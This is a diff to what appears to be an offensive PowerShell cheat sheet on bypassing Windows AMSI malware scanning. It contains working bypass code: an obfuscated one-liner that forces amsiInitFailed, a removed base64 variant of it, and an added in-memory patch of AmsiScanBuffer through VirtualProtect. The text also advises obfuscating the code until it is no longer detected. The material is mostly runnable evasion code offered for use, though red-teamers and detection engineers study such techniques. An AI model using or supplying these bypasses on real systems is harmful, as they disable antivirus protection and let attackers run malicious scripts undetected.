@@ -57,6 +57,7 @@ powershell.exe -executionpolicy bypass
 - https://amsi.fail/
 - Then obfuscate with https://github.com/danielbohannon/Invoke-Obfuscation
 
+### Method 1
 #### Amsi bypass string obfuscated
 ```
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
@@ -69,20 +70,28 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{
 ```
 - Fuck around with invoke-obfuscation till it doesn't get detected anymore
 
-#### Amsi bypass base64 encoded strings
+### Method 2
 ```
-function b64decode
-{
-    param ($encoded)
-    $decoded = $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
-    return $decoded
-}
+$MethodDefinition = @"
+[DllImport(`"kernel32`",  EntryPoint="GetProcAddress")]
+public static extern IntPtr GetProc(IntPtr hModule, string procName);
 
-$1 = b64decode("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=")
-$2 = b64decode("YW1zaUluaXRGYWlsZWQ=")
-$3 = b64decode("Tm9uUHVibGljLFN0YXRpYw==")
+[DllImport(`"kernel32`")]
+public static extern IntPtr GetModuleHandle(string lpModuleName);
 
-[Ref].Assembly.GetType($1).GetField($2,$3).SetValue($null,$true)
+[DllImport(`"kernel32`",EntryPoint="VirtualProtect" )]
+public static extern bool Virtual(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@;
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kern' -NameSpace 'W' -PassThru;
+$ABSD = 'Ams'+'iS'+'canBuffer';
+$handle = [W.Kern]::GetModuleHandle('ams'+'i.dll');
+[IntPtr]$BAddress = [W.Kern]::GetProc($handle, $ABSD);
+[UInt32]$Size = 0x5;
+[UInt32]$PFlag = 0x40;
+[UInt32]$OFlag = 0;
+[W.Kern]::Virtual($BAddress, $Size, $PFlag, [Ref]$OFlag);
+$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
+[system.runtime.interopservices.marshal]::copy($buf, 0, $BAddress, 6);
 ```
 
 #### Creating scripts that bypass amsi
